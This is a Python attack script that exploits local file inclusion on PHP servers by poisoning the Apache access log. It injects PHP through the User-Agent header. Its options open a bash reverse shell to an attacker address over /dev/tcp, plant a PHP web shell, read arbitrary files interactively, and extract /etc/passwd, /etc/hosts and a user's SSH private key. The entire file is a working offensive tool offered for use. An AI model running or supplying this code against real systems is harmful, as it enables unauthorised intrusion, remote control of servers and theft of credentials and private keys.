#!/usr/bin/python3

import os 
import sys 
from time import sleep 
import requests 
import argparse 
import base64

#Modify the exploit for correct use

parser = argparse.ArgumentParser()

parser.add_argument("--rshell", help="""Get one reverse shell for netcat. 
					Ex: http://127.0.0.1/test.php?file=/var/log/apache2/access.log """)
parser.add_argument("--rfiles", help="""Read local files.
					Ex: http://127.0.0.1/test.php?file=""")
parser.add_argument("--wshell", help="""Get a webshell.
					Ex: http://127.0.0.1/test.php?file=/var/log/apache2/access.log""")
parser.add_argument("--info", help="""information extraction: id_rsa, /etc/subgid, /etc/passwd etc...
					Ex: http://127.0.0.1/test.php?file=""")

args = parser.parse_args()


revshell = "bash -i >& /dev/tcp/<IP>/433 0>&1"
webshell = "<?php shell_exec($_REQUEST['cmd']); ?>"

if args.rshell: #Receive a reverse shell via netcat
	try:
		rvshell = base64.b64encode(revshell.encode())
		os.system(""" curl -s -X REQUEST -H "User-Agent: <?php system("echo {} | base64 -d | bash"); ?>" "{}"  """.format(rvshell, args.rshell))
		sleep(2)
		print("\nReverse shell: Pwned")
		sys.exit(0)
	except ValueError:
		print("\nError, Try again\n")

elif args.rfiles: #Read files through an interactive console
	while True:
		readfiles = input("\n~$ ")
		print("")
		url = (args.rfiles + readfiles)
		os.system(f""" curl -s -X POST "{url}" \n""") 	

elif args.wshell: #Receive a Webshell
	try:
		wbshell = base64.b64encode(webshell.encode())
		os.system(""" curl -s -X REQUEST -H "User-Agent: <?php system("echo {} | base64 -d | bash"); ?>" "{}" """.format(wbshell, args.wshell))
		print(f"\nPwned Webshell: {args.wshell}&cmd=<command>")
		sleep(2)
		sys.exit(0)
	except ValueError:
		print("\nError, Try again\n")
		
elif args.info: #In this section you can add more files to read
	
	print("\n--------------------------------")
	etc_subgid = os.system(""" curl -s -X REQUEST "{}/etc/subgid" """.format(args.info))
	sleep(2)

	print("\n\n--------------------------------")
	id_rsa = os.system(f"curl -s -X REQUEST {args.info}/home/<name>/.ssh/id_rsa")
	print("\n\n--------------------------------")
	sleep(2)

	etc_hosts = os.system(f"curl -s -X REQUEST {args.info}/etc/hosts")
	print("\n\n--------------------------------")
	sleep(2)
	
	etc_passwd = os.system(f"curl -s -X REQUEST {args.info}/etc/passwd")
	print("\n\n--------------------------------")
	
else:
	sys.exit(1)
